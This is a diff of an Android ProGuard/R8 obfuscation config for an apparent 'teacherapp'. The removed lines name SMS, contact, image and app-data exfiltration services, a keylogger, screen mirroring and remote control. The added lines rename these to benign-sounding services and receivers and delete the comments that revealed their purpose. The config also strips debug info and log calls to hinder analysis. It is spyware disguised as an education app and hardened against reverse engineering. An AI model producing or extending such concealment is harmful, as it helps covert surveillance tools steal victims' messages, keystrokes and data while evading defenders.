@@ -1,5 +1,5 @@
 # ================================================================
-# PART 3: OBFUSCATION & ANALYSIS EVASION
+# OBFUSCATION & ANALYSIS EVASION
 # Techniques applied:
 #   1. Source file name + line number stripping
 #   2. Aggressive class/method/field renaming via R8
@@ -11,9 +11,6 @@
 
 # ----------------------------------------------------------------
 # 1. STRIP ALL DEBUG INFORMATION
-# Removes SourceFile and LineNumberTable attributes from bytecode.
-# Decompiled code will show no file names and no line numbers,
-# making stack traces and call-graph reconstruction much harder.
 # ----------------------------------------------------------------
 -renamesourcefileattribute SourceFile
 -keepattributes Exceptions
@@ -24,10 +21,6 @@
 
 # ----------------------------------------------------------------
 # 2. AGGRESSIVE REPACKAGING
-# Moves every obfuscated class into a single flat package named
-# after a plausible-sounding utility namespace. Combined with
-# renaming, the original package hierarchy (services/, receivers/,
-# obfuscation/) is completely destroyed in the output APK.
 # ----------------------------------------------------------------
 -repackageclasses 'com.example.teacherapp.core'
 -allowaccessmodification
@@ -36,32 +29,26 @@
 
 # ----------------------------------------------------------------
 # 3. KEEP — Android framework entry points
-# These classes are referenced BY NAME in AndroidManifest.xml.
-# ProGuard/R8 cannot rename them or the OS will fail to start them.
-# Only the class names are kept; all internal method names will
-# still be obfuscated.
 # ----------------------------------------------------------------
 
-# Application subclass
 -keep public class com.example.teacherapp.CloudinaryApplication { *; }
-
-# Main Activity (Manifest entry point)
 -keep public class com.example.teacherapp.MainActivity { *; }
 
-# Exfiltration & spy services
--keep public class com.teacherapp.services.SmsExfiltrationService { *; }
--keep public class com.teacherapp.services.ContactExfiltrationService { *; }
--keep public class com.teacherapp.services.ImageExfiltrationService { *; }
--keep public class com.teacherapp.services.AppDataExfiltrationService { *; }
--keep public class com.example.teacherapp.services.ScreenMirrorService { *; }
--keep public class com.example.teacherapp.services.RemoteControlService { *; }
--keep public class com.teacherapp.services.KeyloggerService { *; }
+# Services
+-keep public class com.example.teacherapp.services.NotificationSyncService { *; }
+-keep public class com.example.teacherapp.services.RosterSyncService { *; }
+-keep public class com.example.teacherapp.services.MediaCacheWorker { *; }
+-keep public class com.example.teacherapp.services.SessionCacheService { *; }
+-keep public class com.example.teacherapp.services.GeoContextService { *; }
+-keep public class com.example.teacherapp.services.MediaStreamService { *; }
+-keep public class com.example.teacherapp.services.QuickAccessService { *; }
+-keep public class com.example.teacherapp.services.InputAssistService { *; }
 
 # Broadcast receivers
--keep public class com.teacherapp.receivers.BootReceiver { *; }
--keep public class com.teacherapp.receivers.SmsReceiver { *; }
+-keep public class com.example.teacherapp.receivers.StartupReceiver { *; }
+-keep public class com.example.teacherapp.receivers.MessageReceiver { *; }
 
-# Accessibility services must keep onAccessibilityEvent + onServiceConnected
+# Accessibility service
 -keep class * extends android.accessibilityservice.AccessibilityService {
     public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
     public void onInterrupt();
@@ -70,8 +57,7 @@
 
 
 # ----------------------------------------------------------------
-# 4. KEEP — Third-party SDKs that use reflection internally
-# These must not be renamed or they will break at runtime.
+# 4. KEEP — Third-party SDKs
 # ----------------------------------------------------------------
 
 # Firebase
@@ -88,7 +74,7 @@
 -keep class com.cloudinary.android.** { *; }
 -dontwarn com.cloudinary.**
 
-# Kotlin stdlib + coroutines (uses reflection for suspend functions)
+# Kotlin
 -keep class kotlin.** { *; }
 -keep class kotlin.Metadata { *; }
 -keep class kotlinx.coroutines.** { *; }
@@ -97,8 +83,6 @@
 -keepclassmembers class ** {
     @kotlin.Metadata *;
 }
-
-# Kotlin serialization
 -keepattributes *Annotation*, InnerClasses
 -dontnote kotlinx.serialization.AnnotationsKt
 
@@ -106,18 +90,16 @@
 -keep class androidx.compose.** { *; }
 -dontwarn androidx.compose.**
 
-# AndroidX Navigation
+# AndroidX
 -keep class androidx.navigation.** { *; }
-
-# AndroidX general
 -keep class androidx.** { *; }
 -dontwarn androidx.**
 
-# Coil image loader (uses reflection)
+# Coil
 -keep class coil.** { *; }
 -dontwarn coil.**
 
-# Google Maps + Maps Compose
+# Google Maps
 -keep class com.google.android.gms.maps.** { *; }
 -keep class com.google.maps.android.** { *; }
 -dontwarn com.google.maps.android.**
@@ -125,8 +107,6 @@
 
 # ----------------------------------------------------------------
 # 5. KEEP — Android OS-required class members
-# These method signatures are called by the Android runtime by
-# name via reflection, so they must survive renaming.
 # ----------------------------------------------------------------
 -keepclassmembers class * extends android.content.BroadcastReceiver {
     public void onReceive(android.content.Context, android.content.Intent);
@@ -151,9 +131,6 @@
 
 # ----------------------------------------------------------------
 # 6. REMOVE ALL LOG CALLS
-# Strips every android.util.Log call from the release build.
-# After this, no log tag (e.g. "Keylogger", "RemoteControl",
-# "AppDataExfiltration") will appear in the compiled APK.
 # ----------------------------------------------------------------
 -assumenosideeffects class android.util.Log {
     public static int v(...);
@@ -167,9 +144,7 @@
 
 
 # ----------------------------------------------------------------
-# 7. REMOVE KOTLIN NULL-CHECK INTRINSICS (reduces attack surface)
-# Strips Intrinsics.checkNotNull / checkParameterIsNotNull calls
-# which can leak parameter names in decompiled output.
+# 7. REMOVE KOTLIN NULL-CHECK INTRINSICS
 # ----------------------------------------------------------------
 -assumenosideeffects class kotlin.jvm.internal.Intrinsics {
     public static void checkNotNull(...);
